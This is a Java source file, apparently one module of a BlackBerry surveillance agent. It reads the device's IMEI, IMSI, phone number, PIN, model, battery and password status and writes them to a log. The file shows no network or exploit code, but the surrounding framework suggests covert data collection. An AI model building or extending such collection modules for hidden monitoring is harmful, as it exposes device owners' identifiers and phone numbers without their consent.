package blackberry.agent;

import net.rim.device.api.system.DeviceInfo;
import blackberry.Device;
import blackberry.log.Log;
import blackberry.log.LogType;
import blackberry.utils.Check;
import blackberry.utils.Debug;
import blackberry.utils.DebugLevel;

public class DeviceInfoAgent extends Agent {
    //#debug
    static Debug debug = new Debug("DeviceInfoAgent", DebugLevel.VERBOSE);

    Device device;

    public DeviceInfoAgent(final boolean agentStatus) {
        super(AGENT_DEVICE, agentStatus, true, "DeviceInfoAgent");
        // #ifdef DBC
        Check.asserts(Log.convertTypeLog(this.agentId) == LogType.DEVICE,
                "Wrong Conversion");
        // #endif

        device = Device.getInstance();
    }

    protected DeviceInfoAgent(final boolean agentStatus, final byte[] confParams) {
        this(agentStatus);
        parse(confParams);
    }

    public void actualRun() {
        // #debug
        debug.trace("run");

        // #ifdef DBC
        Check.requires(log != null, "Null log");
        // #endif

        log.createLog(null);

        boolean ret = true;

        final StringBuffer sb = new StringBuffer();

        // Modello
        sb.append("Processor: ARM\n");
        sb.append("Simultator: " + DeviceInfo.isSimulator() + "\n");
        sb.append("Manifacturer: " + DeviceInfo.getManufacturerName() + "\n");
        sb.append("Model: " + DeviceInfo.getDeviceName() + "\n");
        sb.append("Pin: " + DeviceInfo.getDeviceId() + "\n");

        // Alimentazione
        sb.append("Battery: " + DeviceInfo.getBatteryLevel() + "\n");
        sb.append("BatteryStatus: " + DeviceInfo.getBatteryStatus() + "\n");
        sb.append("BatteryTemperature: " + DeviceInfo.getBatteryTemperature()
                + "\n");
        sb.append("BatteryVoltage: " + DeviceInfo.getBatteryVoltage() + "\n");

        // DISK
        sb.append("FLASH: " + DeviceInfo.getTotalFlashSize() + "\n");

        // OS Version
        sb.append("OS: " + DeviceInfo.getPlatformVersion() + "\n");

        // Device
        sb.append("Camera: " + DeviceInfo.hasCamera() + "\n");
        sb.append("IMEI: " + device.getImei() + "\n");
        sb.append("IMSI: " + device.getImsi() + "\n");
        sb.append("Phone: " + device.getPhoneNumber() + "\n");

        sb.append("IdleTime: " + DeviceInfo.getIdleTime() + "\n");
        sb.append("SoftwareVersion: " + DeviceInfo.getSoftwareVersion() + "\n");
        sb.append("Holster: " + DeviceInfo.isInHolster() + "\n");
        sb.append("PasswordEnabled: " + DeviceInfo.isPasswordEnabled() + "\n");

        ret = log.writeLog(sb.toString(), true);

        if (ret == false) {
            // #debug
            debug.error("Error writing file");
        }

        log.close();

    }

    protected boolean parse(final byte[] confParameters) {
        // TODO Auto-generated method stub
        return false;
    }

}
